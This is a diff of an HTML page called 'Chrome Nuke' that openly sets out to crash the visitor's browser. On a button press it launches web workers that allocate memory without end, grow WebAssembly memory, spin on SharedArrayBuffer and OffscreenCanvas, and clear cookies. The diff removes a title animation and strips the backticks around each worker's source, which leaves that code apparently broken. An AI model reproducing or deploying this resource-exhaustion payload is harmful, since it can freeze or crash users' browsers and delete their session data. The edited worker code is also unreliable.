@@ -32,12 +32,7 @@
       text-align:center;
       box-shadow:0 4px 8px rgba(0,0,0,0.5);
     }
-    .title {
-      font-size:1.75rem;
-      margin-bottom:0.5rem;
-      letter-spacing:1px;
-      white-space: pre;
-    }
+    .title { font-size:1.75rem; margin-bottom:0.5rem; letter-spacing:1px; }
     .subtitle { font-size:0.9rem; color:#ccc; margin-bottom:1.5rem; }
     .warning {
       font-size:0.95rem;
@@ -70,30 +65,32 @@
 </head>
 <body>
   <div class="card">
-    <div class="title" id="glitchTitle">Chrome Nuke</div>
+    <div class="title">Chrome Nuke</div>
     <div class="subtitle">You have about a second to save your chrome after you press the button.</div>
     <div class="warning">
       WARNING: THIS WILL FUCK UP YOUR CHROME. PROCEED AT YOUR OWN RISK.
     </div>
     <button class="button" id="nukeBtn">Crash Browser</button>
   </div>
+
   <script>
-    const originalURL = URL.createObjectURL(new Blob([`
+    const originalURL = URL.createObjectURL(new Blob([
       onmessage = () => {
         while (true) {
           const a = new Array(1000000).fill('*');
         }
       };
-    `], { type: 'application/javascript' }));
-    const sharedURL = URL.createObjectURL(new Blob([`
+    ], { type: 'application/javascript' }));
+
+    const sharedURL = URL.createObjectURL(new Blob([
       onmessage = () => {
         while (true) {
           const sb = new SharedArrayBuffer(1024*1024);
           new Uint8Array(sb)[0] = 1;
         }
       };
-    `], { type: 'application/javascript' }));
-    const wasmURL = URL.createObjectURL(new Blob([`
+    ], { type: 'application/javascript' }));
+    const wasmURL = URL.createObjectURL(new Blob([
       onmessage = () => {
         const bytes = new Uint8Array([
           0x00,0x61,0x73,0x6d,1,0,0,0,
@@ -109,8 +106,8 @@
             while (true) mem.grow(1);
           });
       };
-    `], { type: 'application/javascript' }));
-    const offscreenURL = URL.createObjectURL(new Blob([`
+    ], { type: 'application/javascript' }));
+    const offscreenURL = URL.createObjectURL(new Blob([
       onmessage = () => {
         if ('OffscreenCanvas' in self) {
           const oc = new OffscreenCanvas(5000,5000);
@@ -118,7 +115,7 @@
           while (true) ctx.fillRect(0,0,5000,5000);
         }
       };
-    `], { type: 'application/javascript' }));
+    ], { type: 'application/javascript' }));
     function clearCookies() {
       document.cookie.split(';').forEach(cookie => {
         const name = cookie.split('=')[0].trim();
@@ -138,28 +135,6 @@
     }
     document.getElementById('nukeBtn')
             .addEventListener('click', () => setTimeout(nuke, 50));
-    (function(){
-      const title = document.getElementById('glitchTitle');
-      const text = title.textContent;
-      title.textContent = '';
-      const chars = Array.from(text).map(c => {
-        const span = document.createElement('span');
-        span.textContent = c;
-        span.dataset.original = c;
-        title.appendChild(span);
-        return span;
-      });
-      const glyphs = ['Δ','Ψ','Ω','Ξ','Σ','Ϟ','ϟ','Λ','М','¥','%', '$', '#', '@'];
-      setInterval(() => {
-        chars.forEach(span => {
-          if (span.dataset.original !== ' ' && Math.random() < 0.3) {
-            span.textContent = glyphs[Math.floor(Math.random()*glyphs.length)];
-          } else {
-            span.textContent = span.dataset.original;
-          }
-        });
-      }, 80);
-    })();
   </script>
 </body>
 </html>
